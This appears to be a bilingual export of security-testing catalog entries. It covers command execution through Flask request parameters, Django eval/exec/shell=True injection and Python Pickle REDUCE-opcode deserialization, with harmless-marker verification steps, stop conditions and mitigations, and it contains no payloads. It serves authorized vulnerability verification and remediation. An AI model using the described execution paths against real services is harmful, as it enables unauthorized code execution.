description.zh: 实施“移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying remove direct request-to-evaluator mappings, use fixed operations and parameter allowlists, disable production debugging, and run the service under a low-privilege isolated identity, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

overview.zh: Flask 请求参数命令执行片段用于核对Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数。该条目只在以下前提下适用：视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec。有效判定必须取得一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Flask Request-Parameter Command Execution Snippets checks whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation. It applies when a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec. A valid finding requires stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec，使应用可能暴露“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec, exposing the runtime boundary of whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 先以缺少 cmd 和普通文本参数建立错误处理基线，再逐个绑定真实 request 来源与原代码片段，使用无副作用固定标记确认调用路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: establish missing-cmd and plain-text error baselines, then bind each original snippet to the real request source and use a side-effect-free fixed marker to confirm the call path. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: remove direct request-to-evaluator mappings, use fixed operations and parameter allowlists, disable production debugging, and run the service under a low-privilege isolated identity. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

name.zh: Python/Django 动态执行表达式
name.en: Python and Django Dynamic Execution Expressions

description.zh: 收录 os.system、subprocess、eval 与 exec 的 Python 表达式，只有在 Django 管理功能、模板扩展或调试入口确实执行可控表达式时才构成 RCE。
description.en: Collects Python os.system, subprocess, eval, and exec expressions that become RCE only when a Django management feature, template extension, or debug entry evaluates controllable expressions.

subCategory.zh: Python 动态求值与子进程

prerequisites.zh: 已在授权隔离环境定位“Python/Django 动态执行表达式”的真实输入点、处理器和运行时版本，并确认：Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Python and Django Dynamic Execution Expressions, confirming that Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应。
prerequisites.en: The test worker is disposable and can observe a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log.

title.zh: Django

description.zh: Django包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Django contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs.

opsecTips.zh: Python/Django 动态执行表达式停止条件：“Python/Django 动态执行表达式”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”。
opsecTips.en: Python and Django Dynamic Execution Expressions stop condition: Use only a one-time fixed marker for Python and Django Dynamic Execution Expressions; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs.

opsecTips.zh: Python/Django 动态执行表达式清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python and Django Dynamic Execution Expressions cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

title.zh: 确认“Python/Django 动态执行表达式”执行入口
title.en: Confirm the Python and Django Dynamic Execution Expressions execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls, and record runtime version and service identity.

title.zh: 建立“Python 动态求值与子进程”安全基线
title.en: Establish the Python Dynamic Evaluation and Subprocesses baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log as abnormal evidence.

title.zh: 逐行验证“Python/Django 动态执行表达式”
title.en: Validate Python and Django Dynamic Execution Expressions line by line

description.zh: 测试步骤为：先定位真实动态执行点并用算术表达式验证求值，再选择不调用外部网络的固定命令标记区分 eval、exec 与 subprocess 路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: locate the real dynamic evaluator and confirm evaluation with arithmetic before using a fixed non-network command marker to distinguish eval, exec, and subprocess paths. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying remove dynamic evaluation and shell=True, call fixed functions or subprocess argument arrays with typed parameters, and independently authorize background tasks and management entry points, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

overview.zh: Python/Django 动态执行表达式用于核对应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API。该条目只在以下前提下适用：Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用。有效判定必须取得受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Python and Django Dynamic Execution Expressions checks whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs. It applies when Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls. A valid finding requires a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用，使应用可能暴露“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls, exposing the runtime boundary of whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 先定位真实动态执行点并用算术表达式验证求值，再选择不调用外部网络的固定命令标记区分 eval、exec 与 subprocess 路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: locate the real dynamic evaluator and confirm evaluation with arithmetic before using a fixed non-network command marker to distinguish eval, exec, and subprocess paths. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: remove dynamic evaluation and shell=True, call fixed functions or subprocess argument arrays with typed parameters, and independently authorize background tasks and management entry points. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

name.zh: Python Pickle Reduce 指令流

description.zh: 使用 protocol 0 的 GLOBAL、STRING、TUPLE 与 REDUCE 指令调用 os.system 或 exec，验证不可信 Pickle 数据是否被 Python 反序列化。
description.en: Uses protocol-0 GLOBAL, STRING, TUPLE, and REDUCE opcodes to invoke os.system or exec, testing whether untrusted Pickle data is deserialized by Python.

subCategory.zh: Python Pickle 不安全反序列化

prerequisites.zh: 已确认“Python Pickle Reduce 指令流”的真实 loader、输入格式、依赖版本和允许类型，并满足：服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护。
prerequisites.en: The real loader, format, dependency versions, and allowed types for Python Pickle Reduce Opcode Streams are known, and the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection.

prerequisites.zh: 可在无外网的一次性进程加载正常对象，并观察隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载。
prerequisites.en: A disposable no-network process can load a normal object and observe an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes.

description.zh: Python Pickle RCE包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Python Pickle RCE contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 阳性必须证明输入到达 loader、对象或函数被构造、触发路径执行，并取得隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载。流头、Base64、类名、YAML 标签、解析异常或依赖中存在 gadget 均是假阳性，不能证明“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。
analysis.en: A positive proves loader reachability, object or function construction, trigger execution, and an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes. Headers, Base64, class names, YAML tags, parser errors, or a gadget merely present in dependencies are false positives and do not prove whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions.

opsecTips.zh: Python Pickle Reduce 指令流停止条件：将危险动作替换为一次性临时标记；若 loader 尝试联网、加载远程类、访问真实文件或启动非标记进程，立即杀死隔离进程。 本条重点观察“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。
opsecTips.en: Python Pickle Reduce Opcode Streams stop condition: Replace dangerous effects with a one-time marker; kill the isolated process on network access, remote class loading, real-file access, or a non-marker process. The entry-specific focus is whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions.

opsecTips.zh: Python Pickle Reduce 指令流清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python Pickle Reduce Opcode Streams cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique.

title.zh: 确认“Python Pickle Reduce 指令流”加载 API
title.en: Confirm the Python Pickle Reduce Opcode Streams loader

description.zh: 定位真实反序列化函数、输入来源、允许类型与依赖版本，核对前提“服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护”。
description.en: Locate the real deserializer, source, allowed types, and dependency versions, confirming that the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection.

description.en: Load a fixed data object and record types, lifecycle, and side effects, accepting an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes as abnormal-object evidence.

Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers.
